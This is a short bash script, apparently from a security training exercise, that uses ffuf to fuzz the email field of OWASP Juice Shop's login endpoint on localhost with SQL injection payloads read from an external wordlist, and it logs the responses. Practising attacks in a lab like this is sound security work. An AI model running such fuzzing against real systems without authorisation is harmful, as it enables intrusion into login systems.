#!/bin/bash
# SQL Injection Fuzzing Script for Juice Shop
# Использует ffuf для поиска SQL injection в форме логина

echo "[+] Starting SQL injection fuzzing..."

# Запуск ffuf против Juice Shop
ffuf -w sql_payloads.txt:FUZZ \
     -u http://localhost:3000/rest/user/login \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"email":"FUZZ","password":"test123"}' \
     -mc 200,401,500 \
     -o ffuf_results.json \
     -of json \
     -v

echo "[+] Fuzzing completed!"
